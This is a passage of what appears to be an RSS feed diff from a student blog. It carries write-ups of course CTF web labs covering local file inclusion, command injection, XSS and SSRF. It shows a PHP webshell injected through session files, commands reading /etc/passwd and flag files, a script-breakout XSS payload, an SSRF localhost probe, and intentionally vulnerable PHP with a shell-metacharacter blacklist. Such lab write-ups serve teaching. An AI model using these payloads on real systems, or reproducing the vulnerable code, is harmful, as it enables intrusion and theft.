+It has 2 extra constraint must be bypassed. Use &lt;code>burpsuite&lt;/code> and change valid file signature&lt;/p></description></item><item><title>Simple Web 0x07(Lab - `HakkaMD`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/</guid><description>&lt;h1 id="simple-web-0x07lab---hakkamd">
+ Simple Web 0x07(Lab - &lt;code>HakkaMD&lt;/code>)
+ &lt;a class="anchor" href="#simple-web-0x07lab---hakkamd">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8401">http://h4ck3r.quest:8401&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10241555">資安這條路-Local File Inclusion&lt;/a>&lt;/p>
+&lt;h2 id="exploit---lfi-to-rce">
+ Exploit - LFI to RCE
+ &lt;a class="anchor" href="#exploit---lfi-to-rce">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>First things first, the website has &lt;code>LFI&lt;/code> problem
+&lt;code>http://h4ck3r.quest:8401/?module=/etc/passwd&lt;/code>
+&lt;img src="https://i.imgur.com/Efl4E0c.png" alt="" />&lt;/li>
+&lt;li>&lt;font color="FF0000">&lt;strong>通靈&lt;/strong>&lt;/font>
+It provided &lt;code>phpinfo()&lt;/code> so that we can check the save address of session.
+&lt;img src="https://i.imgur.com/SO727sY.png" alt="" />
+The setting is default, thus we can use &lt;code>LFI&lt;/code> to read session file:
+&lt;code>http://h4ck3r.quest:8401/?module=/tmp/sess_0qvmvnk5lh140239e6ol9l16h1&lt;/code>
+&lt;img src="https://i.imgur.com/AiLGZJA.png" alt="" />
+We can see that session file store the data of what we enter. Therefore, we could enter &lt;code>webshell&lt;/code> to get shell&lt;/li>
+&lt;li>&lt;code>webshell&lt;/code>
+&lt;code>&amp;lt;?php system($_GET['sh']); ?&amp;gt;&lt;/code>
+↓
+&lt;code>http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&amp;amp;sh=ls%20/&lt;/code>
+↓
+&lt;img src="https://i.imgur.com/kqlIf6z.png" alt="" />
+↓
+&lt;code>http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&amp;amp;sh=cat%20/flag_aff6136bbef82137&lt;/code>&lt;/li>
+&lt;li>Then we got flag!!!&lt;/li>
+&lt;/ol></description></item><item><title>Simple Web 0x08(Lab - My First Meow Website)</title><link>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/</guid><description>&lt;h1 id="simple-web-0x08lab---my-first-meow-website">
+ Simple Web 0x08(Lab - My First Meow Website)
+ &lt;a class="anchor" href="#simple-web-0x08lab---my-first-meow-website">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8400/">http://h4ck3r.quest:8400/&lt;/a>
+Target: Login as Admin&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10245020">PHP 偽協議 (一) &lt;/a>
+&lt;a href="https://youtu.be/_hasOTGximc?t=2855">Web Security 0x1&lt;/a>&lt;/p>
+&lt;h2 id="exploit">
+ Exploit
+ &lt;a class="anchor" href="#exploit">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>Observe
+According to the URL, &lt;code>http://h4ck3r.quest:8400/?page=inc/home&lt;/code>, it might have &lt;code>LFI&lt;/code> problem.&lt;/li>
+&lt;li>Use &lt;code>php://filter&lt;/code> to read page
+&lt;code>http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=inc/home&lt;/code>
+:::spoiler page source code
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;
+
+&amp;lt;head&amp;gt;
+ &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;
+ &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;
+ &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;
+ &amp;lt;title&amp;gt;Meow&amp;lt;/title&amp;gt;
+ &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://cdn.jsdelivr.net/npm/bulma@0.9.2/css/bulma.min.css&amp;#34;&amp;gt;
+&amp;lt;/head&amp;gt;
+
+&amp;lt;body&amp;gt;
+ &amp;lt;nav class=&amp;#34;navbar is-dark&amp;#34; role=&amp;#34;navigation&amp;#34; aria-label=&amp;#34;main navigation&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;navbar-brand&amp;#34;&amp;gt;
+ &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/?page=inc/home&amp;#34;&amp;gt;🐱&amp;lt;/a&amp;gt;
+ &amp;lt;/div&amp;gt;
+
+ &amp;lt;div id=&amp;#34;navbarBasicExample&amp;#34; class=&amp;#34;navbar-menu&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;navbar-start&amp;#34;&amp;gt;
+ &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/?page=inc/home&amp;#34;&amp;gt;
+ Home
+ &amp;lt;/a&amp;gt;
+ &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/?page=inc/about&amp;#34;&amp;gt;
+ About
+ &amp;lt;/a&amp;gt;
+ &amp;lt;a class=&amp;#34;navbar-item&amp;#34; href=&amp;#34;/admin.php&amp;#34;&amp;gt;
+ Admin
+ &amp;lt;/a&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;/nav&amp;gt;
+
+ &amp;lt;div class=&amp;#34;container&amp;#34; style=&amp;#34;margin-top: 1em;&amp;#34;&amp;gt;
+ &amp;lt;?php
+ if (isset($_GET[&amp;#39;page&amp;#39;]))
+ include($_GET[&amp;#39;page&amp;#39;] . &amp;#34;.php&amp;#34;);
+ else
+ include(&amp;#34;inc/home.php&amp;#34;);
+ ?&amp;gt;
+ &amp;lt;/div&amp;gt;
+&amp;lt;/body&amp;gt;
+
+&amp;lt;/html&amp;gt;
+&lt;/code>&lt;/pre>:::&lt;/li>
+&lt;li>Observe page source code
+We know that &lt;code>admin.php&lt;/code> is under &lt;code>/&lt;/code> directory.
+&lt;code>http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=admin&lt;/code>
+:::spoiler admin source code
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;h1&amp;gt;Admin Panel&amp;lt;/h1&amp;gt;
+&amp;lt;form&amp;gt;
+ &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;username&amp;#34; value=&amp;#34;admin&amp;#34;&amp;gt;
+ &amp;lt;input type=&amp;#34;password&amp;#34; name=&amp;#34;password&amp;#34;&amp;gt;
+ &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Submit&amp;#34;&amp;gt;
+&amp;lt;/form&amp;gt;
+
+&amp;lt;?php
+$admin_account = array(&amp;#34;username&amp;#34; =&amp;gt; &amp;#34;admin&amp;#34;, &amp;#34;password&amp;#34; =&amp;gt; &amp;#34;kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ&amp;#34;);
+if (
+ isset($_GET[&amp;#39;username&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;password&amp;#39;]) &amp;amp;&amp;amp;
+ $_GET[&amp;#39;username&amp;#39;] === $admin_account[&amp;#39;username&amp;#39;] &amp;amp;&amp;amp; $_GET[&amp;#39;password&amp;#39;] === $admin_account[&amp;#39;password&amp;#39;]
+) {
+ echo &amp;#34;&amp;lt;h1&amp;gt;LOGIN SUCCESS!&amp;lt;/h1&amp;gt;&amp;lt;p&amp;gt;&amp;#34;.getenv(&amp;#39;FLAG&amp;#39;).&amp;#34;&amp;lt;/p&amp;gt;&amp;#34;;
+}
+
+?&amp;gt;
+&lt;/code>&lt;/pre>:::&lt;/li>
+&lt;li>Then we get admin password is: &lt;code>kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ&lt;/code>. Then we got flag!!!&lt;/li>
+&lt;/ol></description></item><item><title>Simple Web 0x09(Lab - DNS Lookup Tool)</title><link>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/</guid><description>&lt;h1 id="simple-web-0x09lab---dns-lookup-tool">
+ Simple Web 0x09(Lab - DNS Lookup Tool)
+ &lt;a class="anchor" href="#simple-web-0x09lab---dns-lookup-tool">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8300/">http://h4ck3r.quest:8300/&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php="> &amp;lt;?php
+isset($_GET[&amp;#39;source&amp;#39;]) and die(show_source(__FILE__, true));
+?&amp;gt;
+
+&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;
+
+&amp;lt;head&amp;gt;
+ &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;
+ &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;
+ &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;
+ &amp;lt;title&amp;gt;DNS Lookup Tool | Baby&amp;lt;/title&amp;gt;
+ &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css&amp;#34;&amp;gt;
+&amp;lt;/head&amp;gt;
+
+&amp;lt;body&amp;gt;
+ &amp;lt;section class=&amp;#34;section&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;column is-6 is-offset-3 has-text-centered&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;box&amp;#34;&amp;gt;
+ &amp;lt;h1 class=&amp;#34;title&amp;#34;&amp;gt;DNS Lookup Tool 🔍&amp;lt;/h1&amp;gt;
+ &amp;lt;form method=&amp;#34;POST&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;field&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;control&amp;#34;&amp;gt;
+ &amp;lt;input class=&amp;#34;input&amp;#34; type=&amp;#34;text&amp;#34; name=&amp;#34;name&amp;#34; placeholder=&amp;#34;example.com&amp;#34; id=&amp;#34;hostname&amp;#34; value=&amp;#34;&amp;lt;?= $_POST[&amp;#39;name&amp;#39;] ?? &amp;#39;&amp;#39; ?&amp;gt;&amp;#34;&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;button class=&amp;#34;button is-block is-info is-fullwidth&amp;#34;&amp;gt;
+ Lookup!
+ &amp;lt;/button&amp;gt;
+ &amp;lt;/form&amp;gt;
+ &amp;lt;br&amp;gt;
+ &amp;lt;?php if (isset($_POST[&amp;#39;name&amp;#39;])) : ?&amp;gt;
+ &amp;lt;section class=&amp;#34;has-text-left&amp;#34;&amp;gt;
+ &amp;lt;p&amp;gt;Lookup result:&amp;lt;/p&amp;gt;
+ &amp;lt;pre&amp;gt;&amp;lt;?= shell_exec(&amp;#34;host &amp;#39;&amp;#34; . $_POST[&amp;#39;name&amp;#39;] . &amp;#34;&amp;#39;;&amp;#34;) ?&amp;gt;&amp;lt;/pre&amp;gt;
+ &amp;lt;/section&amp;gt;
+ &amp;lt;?php endif; ?&amp;gt;
+ &amp;lt;hr&amp;gt;
+ &amp;lt;a id=&amp;#34;magic&amp;#34;&amp;gt;Magic&amp;lt;/a&amp;gt; | &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;Source Code&amp;lt;/a&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;article class=&amp;#34;message is-link is-hidden is-size-4&amp;#34; id=&amp;#34;hint&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;message-body is-family-monospace&amp;#34;&amp;gt;
+ host &amp;#39;&amp;lt;span class=&amp;#34;has-text-danger&amp;#34; id=&amp;#34;command&amp;#34;&amp;gt;&amp;lt;/span&amp;gt;&amp;#39;;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;/article&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;/section&amp;gt;
+
+ &amp;lt;script&amp;gt;
+ magic.onclick = () =&amp;gt; hint.classList.toggle(&amp;#34;is-hidden&amp;#34;);
+ window.onload = hostname.oninput = () =&amp;gt; command.textContent = hostname.value;
+ &amp;lt;/script&amp;gt;
+&amp;lt;/body&amp;gt;
+
+&amp;lt;/html&amp;gt; 
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x10(Lab - DNS Lookup Tool | WAF)</title><link>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/</guid><description>&lt;h1 id="simple-web-0x10lab---dns-lookup-tool--waf">
+ Simple Web 0x10(Lab - DNS Lookup Tool | WAF)
+ &lt;a class="anchor" href="#simple-web-0x10lab---dns-lookup-tool--waf">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://youtu.be/7b8uMzpCfug?t=3612">2022/03/30 網頁安全&lt;/a>
+&lt;a href="https://lab.feifei.tw/practice/ci/l1.php">Command injection&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php="> &amp;lt;?php
+isset($_GET[&amp;#39;source&amp;#39;]) and die(show_source(__FILE__, true));
+?&amp;gt;
+
+&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;
+
+&amp;lt;head&amp;gt;
+ &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;
+ &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;
+ &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;
+ &amp;lt;title&amp;gt;DNS Lookup Tool | WAF&amp;lt;/title&amp;gt;
+ &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css&amp;#34;&amp;gt;
+&amp;lt;/head&amp;gt;
+
+&amp;lt;body&amp;gt;
+ &amp;lt;section class=&amp;#34;section&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;column is-6 is-offset-3 has-text-centered&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;box&amp;#34;&amp;gt;
+ &amp;lt;h1 class=&amp;#34;title&amp;#34;&amp;gt;DNS Lookup Tool 🔍 | WAF Edition&amp;lt;/h1&amp;gt;
+ &amp;lt;form method=&amp;#34;POST&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;field&amp;#34;&amp;gt;
+ &amp;lt;div class=&amp;#34;control&amp;#34;&amp;gt;
+ &amp;lt;input class=&amp;#34;input&amp;#34; type=&amp;#34;text&amp;#34; name=&amp;#34;name&amp;#34; placeholder=&amp;#34;example.com&amp;#34; id=&amp;#34;hostname&amp;#34; value=&amp;#34;&amp;lt;?= $_POST[&amp;#39;name&amp;#39;] ?? &amp;#39;&amp;#39; ?&amp;gt;&amp;#34;&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;button class=&amp;#34;button is-block is-info is-fullwidth&amp;#34;&amp;gt;
+ Lookup!
+ &amp;lt;/button&amp;gt;
+ &amp;lt;/form&amp;gt;
+ &amp;lt;br&amp;gt;
+ &amp;lt;?php if (isset($_POST[&amp;#39;name&amp;#39;])) : ?&amp;gt;
+ &amp;lt;section class=&amp;#34;has-text-left&amp;#34;&amp;gt;
+ &amp;lt;p&amp;gt;Lookup result:&amp;lt;/p&amp;gt;
+ &amp;lt;pre&amp;gt;
+ &amp;lt;?php
+ $blacklist = [&amp;#39;|&amp;#39;, &amp;#39;&amp;amp;&amp;#39;, &amp;#39;;&amp;#39;, &amp;#39;&amp;gt;&amp;#39;, &amp;#39;&amp;lt;&amp;#39;, &amp;#34;\n&amp;#34;, &amp;#39;flag&amp;#39;];
+ $is_input_safe = true;
+ foreach ($blacklist as $bad_word)
+ if (strstr($_POST[&amp;#39;name&amp;#39;], $bad_word) !== false) $is_input_safe = false;
+
+ if ($is_input_safe)
+ system(&amp;#34;host &amp;#39;&amp;#34; . $_POST[&amp;#39;name&amp;#39;] . &amp;#34;&amp;#39;;&amp;#34;);
+ else
+ echo &amp;#34;HACKER!!!&amp;#34;;
+ ?&amp;gt;
+ &amp;lt;/pre&amp;gt;
+ &amp;lt;/section&amp;gt;
+ &amp;lt;?php endif; ?&amp;gt;
+ &amp;lt;hr&amp;gt;
+ &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;Source Code&amp;lt;/a&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;/div&amp;gt;
+ &amp;lt;/section&amp;gt;
+&amp;lt;/body&amp;gt;
+
+&amp;lt;/html&amp;gt; 
+&lt;/code>&lt;/pre>&lt;p>:::
+It set some protection such as blacklist.&lt;/p></description></item><item><title>Simple Web 0x11(Lab - XSS Me)</title><link>https://bernie6401.github.io/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/</guid><description>&lt;h1 id="simple-web-0x11lab---xss-me">
+ Simple Web 0x11(Lab - XSS Me)
+ &lt;a class="anchor" href="#simple-web-0x11lab---xss-me">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8800/">http://h4ck3r.quest:8800/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler
+攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客(這是其中一種受害方式，也可能很直接的被盜取&lt;code>COOKIE&lt;/code>之類的)
+&lt;img src="https://i.imgur.com/lZ0bj41.png" alt="" />&lt;/p>
+&lt;p>&lt;img src="https://i.imgur.com/grJXpr7.png" alt="" />&lt;/p>
+&lt;p>&lt;img src="https://i.imgur.com/q9fwa6z.png" alt="" />
+:::&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
+&amp;lt;script&amp;gt;
+ const message = {&amp;#34;icon&amp;#34;: &amp;#34;error&amp;#34;, &amp;#34;titleText&amp;#34;: &amp;#34;User not found.&amp;#34;, &amp;#34;timer&amp;#34;: 3000, &amp;#34;showConfirmButton&amp;#34;: false, &amp;#34;timerProgressBar&amp;#34;: true};
+ window.onload = function () {
+ if (message !== null) Swal.fire(message);
+ }
+&amp;lt;/script&amp;gt;
+...
+&lt;/code>&lt;/pre>&lt;h2 id="exploit">
+ Exploit
+ &lt;a class="anchor" href="#exploit">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>Check XSS
+&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
+&amp;lt;script&amp;gt;
+ const message = {&amp;#34;icon&amp;#34;: &amp;#34;error&amp;#34;, &amp;#34;titleText&amp;#34;: &amp;#34;youshallnotpass&amp;#34;, &amp;#34;timer&amp;#34;: 3000, &amp;#34;showConfirmButton&amp;#34;: false, &amp;#34;timerProgressBar&amp;#34;: true};
+ window.onload = function () {
+ if (message !== null) Swal.fire(message);
+ }
+&amp;lt;/script&amp;gt;
+...
+&lt;/code>&lt;/pre>&lt;img src="https://i.imgur.com/OffMAUF.png" alt="" />&lt;/li>
+&lt;li>Try to inject script tag
+Payload: &lt;code>http://h4ck3r.quest:8800/?type=error&amp;amp;message=%3C/script%3E%3Cscript%3Ealert(123)%3C/script%3E//&lt;/code>
+&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
+&amp;lt;script&amp;gt;
+ const message = {&amp;#34;icon&amp;#34;: &amp;#34;error&amp;#34;, &amp;#34;titleText&amp;#34;: &amp;#34;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(123)&amp;lt;/script&amp;gt;//&amp;#34;, &amp;#34;timer&amp;#34;: 3000, &amp;#34;showConfirmButton&amp;#34;: false, &amp;#34;timerProgressBar&amp;#34;: true};
+ window.onload = function () {
+ if (message !== null) Swal.fire(message);
+ }
+&amp;lt;/script&amp;gt;
+&lt;/code>&lt;/pre>&lt;img src="https://i.imgur.com/1cZJvIv.png" alt="" />&lt;/li>
+&lt;/ol>
+&lt;ul>
+&lt;li>Hint
+If you login as guest(password = guest), then you can get the response
+&lt;img src="https://i.imgur.com/s2R75Xf.png" alt="" />&lt;/li>
+&lt;/ul>
+&lt;ol start="3">
+&lt;li>
+&lt;p>Fetch flag and send to &lt;a href="https://beeceptor.com/">beeceptor&lt;/a>
+Payload:&lt;/p></description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/</guid><description>&lt;h1 id="simple-web-0x12lab---web-preview-card">
+ Simple Web 0x12(Lab - Web Preview Card)
+ &lt;a class="anchor" href="#simple-web-0x12lab---web-preview-card">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8500/">http://h4ck3r.quest:8500/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://youtu.be/hWC-Evt-sBc?t=6136">Web Hacking | 續章【EDU-CTF 2021】&lt;/a>
+&lt;a href="https://medium.com/%e7%a8%8b%e5%bc%8f%e7%8c%bf%e5%90%83%e9%a6%99%e8%95%89/%e7%b6%b2%e7%ab%99%e5%ae%89%e5%85%a8-%e4%bc%ba%e6%9c%8d%e5%99%a8%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0-ssrf-%e6%94%bb%e6%93%8a-%e9%a0%85%e8%8e%8a%e8%88%9e%e5%8a%8d-%e6%84%8f%e5%9c%a8%e6%b2%9b%e5%85%ac-7a5524926362">網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」&lt;/a>&lt;/p>
+&lt;h2 id="exploit---ssrf">
+ Exploit - SSRF
+ &lt;a class="anchor" href="#exploit---ssrf">#&lt;/a>
+&lt;/h2>
+&lt;p>When you see a preview function, then it may have SSRF problem.&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Test it
+&lt;code>file:///etc/passwd&lt;/code> or &lt;code>http://127.0.0.1&lt;/code>
+&lt;img src="https://i.imgur.com/NKbIlDT.png" alt="" />&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Analyze &lt;code>flag.php&lt;/code>
+&lt;img src="https://i.imgur.com/OGo7biu.png" alt="" />
+:::spoiler source code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
+if ($_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;] !== &amp;#39;127.0.0.1&amp;#39;) die(&amp;#34;Only for localhost user.&amp;#34;);
+?&amp;gt;
+&amp;lt;form action=&amp;#34;/flag.php&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt;
+ Do you want the FLAG? &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;givemeflag&amp;#34; value=&amp;#34;no&amp;#34;&amp;gt;
+ &amp;lt;input type=&amp;#34;submit&amp;#34;&amp;gt;
+&amp;lt;/form&amp;gt;
+&amp;lt;?php
+if (isset($_POST[&amp;#39;givemeflag&amp;#39;]) &amp;amp;&amp;amp; $_POST[&amp;#39;givemeflag&amp;#39;] === &amp;#39;yes&amp;#39;)
+ echo &amp;#34;FLAG:&amp;#34;, getenv(&amp;#39;FLAG&amp;#39;);
+&lt;/code>&lt;/pre>&lt;p>:::
+If you want flag, you need visit &lt;code>/flag.php&lt;/code> as localhost and send a form data with parameter &lt;code>givemeflag&lt;/code>.&lt;/p></description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/</guid><description>&lt;h1 id="simple-web-0x12lab---web-preview-card">
+ Simple Web 0x12(Lab - Web Preview Card)
+ &lt;a class="anchor" href="#simple-web-0x12lab---web-preview-card">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8500/">http://h4ck3r.quest:8500/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://youtu.be/hWC-Evt-sBc?t=6136">Web Hacking | 續章【EDU-CTF 2021】&lt;/a>
